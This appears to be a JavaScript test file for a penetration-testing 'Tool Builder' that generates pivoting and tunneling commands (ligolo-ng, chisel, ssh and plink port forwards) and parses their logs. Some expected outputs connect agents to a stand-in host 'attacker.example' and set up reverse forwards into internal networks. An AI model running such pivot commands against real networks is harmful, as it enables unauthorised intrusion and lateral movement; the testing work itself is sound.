'use strict';

const assert=require('assert');
const fs=require('fs');
const path=require('path');
const vm=require('vm');

const root=path.join(__dirname,'..');
const read=rel=>fs.readFileSync(path.join(root,rel),'utf8');

function runBrowserish(files){
 const sandbox={window:{location:{hash:'#/tools/ligolo-ng'}},globalThis:null,module:{exports:{}},console};
 sandbox.globalThis=sandbox.window;
 vm.createContext(sandbox);
 for(const rel of files)vm.runInContext(read(rel),sandbox,{filename:rel});
 return sandbox.window;
}

const w=runBrowserish([
 'data/tool-builder-schema.js',
 'data/tool-builder-inventory.js',
 'assets/tool-builder-current.js',
 'data/tool-builders.js',
 'data/tool-builders-tunnels.js',
 'data/product-hardening/pivoting-tunneling-route-proof-cluster-v9.91.js'
]);

const renderer=w.OBOL_TOOL_BUILDER;
const builders=w.OBOL_TOOL_BUILDERS;
const inventory=w.OBOL_TOOL_BUILDER_INVENTORY;
const tunnel=w.OBOL_TUNNEL_TOOL_BUILDERS;
const analyzer=w.OBOL_PIVOTING_TUNNELING_ROUTE_ANALYZER_V991;
assert(renderer&&builders&&inventory&&tunnel&&analyzer,'v10.04 pivot Tool Builder and Evidence owners must load');
assert.strictEqual(tunnel.version,'1.1.0','v10.04 must advance the existing tunnel-builder owner instead of adding a parallel owner');

function b(id){const found=builders.byId&&builders.byId[id];assert(found,'missing builder '+id);return found;}
function compile(id,values){return renderer.compile(b(id),builders.defaultsFor(id,values||{},{}),{});}

assert.strictEqual(inventory.get('ligolo-ng').status,'implemented','Ligolo-ng must graduate from modeled to implemented');
assert.strictEqual(inventory.get('ligolo-ng').queueItem,'tb-ligolo-ng');
assert.strictEqual(inventory.get('ligolo-agent').queueItem,'tb-ligolo-ng');
assert.strictEqual(inventory.get('ligolo-proxy').queueItem,'tb-ligolo-ng');
assert.strictEqual(inventory.get('proxychains').status,'superseded','proxychains should remain a SOCKS companion rather than a standalone builder');
assert.deepStrictEqual(Array.from(inventory.validate()),[],'projected pivot inventory must remain valid');

assert.strictEqual(compile('tb-ligolo-ng',{mode:'proxy'}),'ligolo-proxy -selfcert','Ligolo proxy starts from the selected safe TLS base without listener clutter');
assert.strictEqual(compile('tb-ligolo-ng',{mode:'agent',agentConnect:'attacker.example:11601'}),'ligolo-agent -connect attacker.example:11601','Ligolo agent starts from connect target only');
assert.strictEqual(compile('tb-ligolo-ng',{mode:'agent',agentConnect:'attacker.example:11601',agentFingerprint:'ABCDEF012345',agentVerbose:true}),'ligolo-agent -connect attacker.example:11601 -accept-fingerprint ABCDEF012345 -v','Ligolo certificate proof and verbose output must be additive');
assert.strictEqual(compile('tb-ligolo-ng',{mode:'fingerprint'}),'certificate_fingerprint');
assert.strictEqual(compile('tb-ligolo-ng',{mode:'interface-create',interfaceName:'ligolo'}),'interface_create --name ligolo');
assert.strictEqual(compile('tb-ligolo-ng',{mode:'ifconfig'}),'ifconfig');
assert.strictEqual(compile('tb-ligolo-ng',{mode:'route-add',interfaceName:'ligolo',routeCidr:'192.168.56.0/24'}),'interface_add_route --name ligolo --route 192.168.56.0/24');
assert.strictEqual(compile('tb-ligolo-ng',{mode:'tunnel-start',interfaceName:'ligolo'}),'tunnel_start --tun ligolo');
assert.strictEqual(compile('tb-ligolo-ng',{mode:'listener-add',listenerAddr:'0.0.0.0:1234',listenerTo:'127.0.0.1:4321',listenerProtocol:'tcp'}),'listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp');
assert.strictEqual(compile('tb-ligolo-ng',{mode:'listener-list'}),'listener_list');
assert.strictEqual(compile('tb-ligolo-ng',{mode:'listener-stop',listenerId:'0'}),'listener_stop 0');
assert.throws(()=>compile('tb-ligolo-ng',{mode:'agent'}),/Proxy address for agent/,'Ligolo agent must not invent a proxy address');
assert.throws(()=>compile('tb-ligolo-ng',{mode:'route-add',interfaceName:'ligolo'}),/Internal route \/ CIDR/,'Ligolo route mode must require real route material');

assert.strictEqual(compile('tb-chisel',{role:'server'}),'chisel server','chisel server mode must omit default host/port clutter');
assert.strictEqual(compile('tb-chisel',{role:'server',serverPort:'9090',allowReverse:true}),'chisel server --port 9090 --reverse','chisel listener/reverse controls remain additive');
assert.strictEqual(compile('tb-chisel',{role:'client',serverUrl:'http://10.10.10.10:8080',remoteMode:'socks'}),'chisel client http://10.10.10.10:8080 socks','chisel client keeps only selected server and remote mode');

assert.strictEqual(compile('tb-ssh-plink',{client:'ssh',forwardMode:'local',target:'10.10.10.10',username:'alice',listenPort:'8080',destinationHost:'127.0.0.1',destinationPort:'80'}),'ssh -L 8080:127.0.0.1:80 alice@10.10.10.10','OpenSSH local forwarding must start from the actual forwarding command without default -N/failure clutter');
assert.strictEqual(compile('tb-ssh-plink',{client:'ssh',forwardMode:'dynamic',target:'10.10.10.10',username:'alice',listenPort:'1080',noShell:true,exitOnForwardFailure:true}),'ssh -N -o ExitOnForwardFailure=yes -D 1080 alice@10.10.10.10','OpenSSH safety/forward-only switches are additive controls');
assert.strictEqual(compile('tb-ssh-plink',{client:'plink',forwardMode:'remote',target:'10.10.10.10',username:'alice',listenPort:'4444',destinationHost:'127.0.0.1',destinationPort:'3389'}),'plink -R 4444:127.0.0.1:3389 -l alice 10.10.10.10','Plink forwarding must not emit batch/password/host-key clutter by default');

const ligolo=b('tb-ligolo-ng');
for(const token of ['Agent joined','Interface created','Route created','Starting tunnel','service-specific connectivity','cleanup'])assert((ligolo.evidence.expectation+' '+ligolo.evidence.proofBoundary).includes(token),'Ligolo Evidence contract missing '+token);
assert(ligolo.evidence.proofBoundary.includes('do not prove an internal host or service is reachable'),'Ligolo setup state must not be promoted to reachability');

const startup=Array.from(analyzer.analyze(`
ligolo-agent -connect 10.10.10.1:11601
INFO[0000] Connection established addr="10.10.10.1:11601"
INFO[0102] Agent joined. name=lab
ligolo-ng » interface_create --name ligolo
INFO Interface created!
ligolo-ng » interface_add_route --name ligolo --route 192.168.56.0/24
INFO Route created.
[Agent] » tunnel_start --tun ligolo
INFO Starting tunnel to lab
`).outcomeFacts);
for(const fact of ['pivot.ligolo_transport_observed','pivot.ligolo_route_setup_observed','pivot.ligolo_tunnel_observed'])assert(startup.includes(fact),'Ligolo setup Evidence missing observed fact '+fact);
assert(!startup.some(f=>/proven|reachable|access|admin|root|system/.test(f)),'Ligolo startup-only Evidence must not manufacture a proven reachability/access/privilege fact');
assert(!startup.includes('pivot.connectivity_state_observed'),'Starting a Ligolo tunnel must not itself count as service connectivity');

const listener=Array.from(analyzer.analyze(`
[Agent] » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp
INFO Listener created on remote agent!
[Agent] » listener_list
Active listeners
[Agent] » listener_stop 0
INFO Listener closed.
`).outcomeFacts);
assert(listener.includes('pivot.ligolo_listener_observed'),'Ligolo listener state must be recognized');
assert(listener.includes('pivot.ligolo_cleanup_observed'),'Ligolo listener teardown must be recognized');
assert(listener.includes('pivot.cleanup_state_observed'),'Ligolo teardown must feed the existing cleanup evidence vocabulary');

const connectivity=Array.from(analyzer.analyze(`
ligolo-ng » tunnel_start --tun ligolo
INFO Starting tunnel to lab
$ nmap -Pn -n -p 445 192.168.56.10
445/tcp open microsoft-ds
`).outcomeFacts);
assert(connectivity.includes('pivot.connectivity_state_observed'),'A separate service-specific result can establish observed connectivity state');

const roadmap=read('docs/TOOL-BUILDER-BUILD-QUEUE.md');
for(const token of ['## Cross-build Evidence contract','same build must reuse or extend the current Evidence analyzer','v10.07 is therefore a cross-surface handoff and consistency audit','Startup-only Ligolo-ng Evidence produces only observed/setup facts'])assert(roadmap.includes(token),'Tool Builder queue Evidence contract missing '+token);

const queueSource=read('data/product-hardening/card-wrapper-retirement-queue-v9.98.js');
for(const token of ["evidencePolicy','same-build-builder-and-evidence'","evidenceDeferredToV1007',false","currentBatch','v10.04-pivot-remote-access'","negativeProofRequired',true"])assert(queueSource.includes(token),'live Product Build Next Tool Builder backlog missing '+token);

const readme=read('README.md');
for(const token of ['Evidence-integrated','v10.04 — Pivot and remote-access first batch','v10.07 — Path/Card/Evidence handoff audit'])assert(readme.includes(token),'README Tool Builder handoff missing '+token);

console.log('v10.04 pivot Tool Builder and same-build Evidence validation passed.');
